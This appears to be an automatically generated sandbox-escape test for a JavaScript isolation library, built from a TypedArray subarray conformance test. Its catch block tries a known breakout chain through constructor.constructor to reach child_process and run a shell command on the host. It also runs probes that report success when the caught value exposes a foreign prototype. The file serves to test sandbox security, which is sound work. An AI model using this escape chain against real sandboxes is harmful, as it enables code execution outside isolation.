try {
    var subarray = TypedArray.prototype.subarray;
    assert.throws(TypeError, function () {
        throw () => {
            return () => {
            };
        };
        subarray.call(undefined, 0, 0);
    }, 'this is undefined');
    assert.throws(TypeError, function () {
        subarray.call(null, 0, 0);
    }, 'this is null');
    assert.throws(TypeError, function () {
        subarray.call(42, 0, 0);
    }, 'this is 42');
    assert.throws(TypeError, function () {
        subarray.call('1', 0, 0);
    }, 'this is a string');
    assert.throws(TypeError, function () {
        subarray.call(true, 0, 0);
    }, 'this is true');
    assert.throws(TypeError, function () {
        subarray.call(false, 0, 0);
    }, 'this is false');
    var s = Symbol('s');
    assert.throws(TypeError, function () {
        subarray.call(s, 0, 0);
    }, 'this is a Symbol');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}